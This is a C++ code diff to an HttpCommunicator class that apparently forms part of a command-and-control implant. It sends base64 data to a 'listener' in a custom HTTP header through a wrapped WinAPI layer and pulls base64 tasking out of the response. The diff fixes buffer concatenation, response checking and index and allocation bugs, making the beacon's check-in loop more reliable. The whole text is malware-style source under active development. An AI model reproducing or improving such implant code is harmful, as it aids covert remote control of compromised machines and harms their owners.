@@ -69,15 +69,15 @@ void HttpCommunicator::CommunicateOnceWithListener(BOOL forRegistration)
     if (communicationHeaderBuffer == NULL)
         goto CLEANUP;
 
-    CopyBuffer(communicationHeaderBuffer, strHttpCommunicationHeaderName, STRING_HTTP_COMMUNICATION_HEADER_LEN);
-    CopyBuffer((PBYTE)communicationHeaderBuffer + STRING_HTTP_COMMUNICATION_HEADER_LEN, ": ", 2);
-    CopyBuffer((PBYTE)communicationHeaderBuffer + STRING_HTTP_COMMUNICATION_HEADER_LEN + 2, pBufferB64ToSend, bufferB64ToSendSize);
+    ConcatString((PCHAR)communicationHeaderBuffer, strHttpCommunicationHeaderName);
+    ConcatString((PCHAR)communicationHeaderBuffer, ": ");
+    ConcatString((PCHAR)communicationHeaderBuffer, (PCHAR)pBufferB64ToSend);
 
     // Initialise response size
     DWORD responseSize = 0;
 
     // Send web request
-    SendWebRequest(
+    DWORD sendWebRequestReturnVal = SendWebRequest(
         this->pWinApiCustom,
         FALSE,
         "GET",
@@ -88,6 +88,9 @@ void HttpCommunicator::CommunicateOnceWithListener(BOOL forRegistration)
         &pResponseBuffer,
         &responseSize,
         1024);
+
+    if (sendWebRequestReturnVal != 0 || responseSize == 0)
+        goto CLEANUP;
 
     // From response, extract actual Data; ";base64," + DATA_B64 + "\""
     static CHAR strMimeBase64[STRING_MIME_BASE64_LEN + 1] = ""; // ";base64,"
@@ -104,13 +107,13 @@ void HttpCommunicator::CommunicateOnceWithListener(BOOL forRegistration)
     DWORD dataBase64IndexEnd = StringSearchSubstring("\"", (PCHAR)pResponseBuffer + dataBase64IndexStart);
     if (dataBase64IndexEnd == -1)
         goto CLEANUP;
-    dataBase64IndexEnd -= 1;
+    dataBase64IndexEnd = dataBase64IndexEnd + dataBase64IndexStart - 1;
 
     if (dataBase64IndexStart >= dataBase64IndexEnd)
         goto CLEANUP;
 
     DWORD dataBase64Size = dataBase64IndexEnd - dataBase64IndexStart + 1;
-    dataBase64 = this->pWinApiCustom->HeapAllocCustom(dataBase64Size);
+    dataBase64 = this->pWinApiCustom->HeapAllocCustom(dataBase64Size + 1);
     if (dataBase64 == NULL)
         goto CLEANUP;
     CopyBuffer(dataBase64, (PCHAR)pResponseBuffer + dataBase64IndexStart, dataBase64Size);
